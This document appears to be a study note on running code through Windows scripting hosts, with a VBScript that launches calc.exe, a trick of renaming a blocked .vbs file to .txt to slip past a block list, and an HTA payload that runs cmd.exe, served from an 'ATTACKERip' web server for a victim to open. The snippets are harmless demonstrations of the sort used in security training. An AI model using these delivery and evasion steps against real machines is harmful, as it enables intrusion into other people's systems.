Windows Scripting Host (WSH)

Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.

It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe

Simple VBScript code:
  create file 'hello.vbs' enter in: 

        Dim message 
        message = "Hello World"
        MsgBox message

DIM declares var of 'message'
next, we store the string in var
next, the  MsgBox function shows the content of the var
EXECUTE file w/ 
        
        # wscript.exe hello.vbs

--------------------------------
VBScript to run executable files
--------------------------------
the following vbs code is to invoke the Windows calculator prompt, proof that we can execute .exe files using the Windows native engine (WSH)
  create file 'payload.vbs' and enter in:
  
        Set shell = WScript.CreateObject("Wscript.Shell")
        shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
        
We create an object of the WScript library using CreateObject to call the execution payload
next, 'Run' method to execute the payload w/
  
        # wscript.exe payload.vbs     /OR/    # cscript.exe payload.vbs
        
 If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows:
        
        # wscript /e:VBScript payload.txt

-----------------------------------
HTML Application (HTA)   MSHTA.exe
-----------------------------------
HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered
HTAs are dynamic HTML pages containing JScript and VBScript
MSHTA.exe is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer

the following HTML payload uses 'ActiveXObject' to execute cmd.exe. 
   create file 'payload.hta' and enter:
          <html>
          <body>
          <script>
            var c= 'cmd.exe'
            new ActiveXObject('WScript.Shell').Run(c);
          </script>
          </body>
          </html>
    Serve file via:
      
          # python3 -m http.server 8080
[victim machine]
    visit -> http://ATTACKERip:8080/payload.hta

Visual Basic for Application (VBA)
----------------------------------
a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint
VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications
Macros are Microsoft Office applications that contain embedded code written in a programming language known as (VBA)
VBA's features is accessing the Windows Application Programming Interface (API) and other low-level functionality
